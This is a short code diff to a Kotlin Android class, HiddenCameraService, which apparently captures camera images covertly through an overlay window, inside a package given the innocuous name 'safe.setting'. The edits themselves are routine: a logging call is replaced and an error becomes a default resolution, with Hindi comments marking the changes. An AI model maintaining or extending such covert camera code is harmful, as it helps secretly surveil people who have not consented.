@@ -9,6 +9,7 @@ import android.hardware.camera2.CameraCharacteristics
 import android.hardware.camera2.CameraManager
 import android.os.Handler
 import android.os.Looper
+import android.util.Log
 import android.util.Size
 import androidx.core.app.ActivityCompat
 import android.view.ViewGroup
@@ -18,9 +19,7 @@ import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.isFrontCameraAvailable
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraResolution
-import com.pawegio.kandroid.d
-
-
+// import com.pawegio.kandroid.d // **** पुराना इम्पोर्ट हटा दिया गया ****
 
 class HiddenCameraService(private val context: Context, private val cameraCallbacks: CameraCallbacks) {
 
@@ -45,7 +44,7 @@ class HiddenCameraService(private val context: Context, private val cameraCallba
             val cameraSize: Size? = when (cameraConfig.resolution) {
                 CameraResolution.MEDIUM_RESOLUTION -> pictureSizes?.get(pictureSizes.size / 2)
                 CameraResolution.SLOW_RESOLUTION -> pictureSizes?.last()
-                else -> throw RuntimeException("Invalid camera resolution.")
+                else -> pictureSizes?.first() // सुरक्षित डिफ़ॉल्ट
             }
             CameraPreview.cameraSize = cameraSize
 
@@ -68,7 +67,9 @@ class HiddenCameraService(private val context: Context, private val cameraCallba
             mWindowManager?.removeView(mCameraPreview)
             mCameraPreview!!.stopPreviewAndFreeCamera()
             mCameraPreview = null
-            d(TAG, "camera stop")
+            // **** बदला हुआ कोड: kandroid.d को Log.d से बदलें ****
+            Log.d(TAG, "camera stop")
+            // **** बदलाव समाप्त ****
         }
     }
 
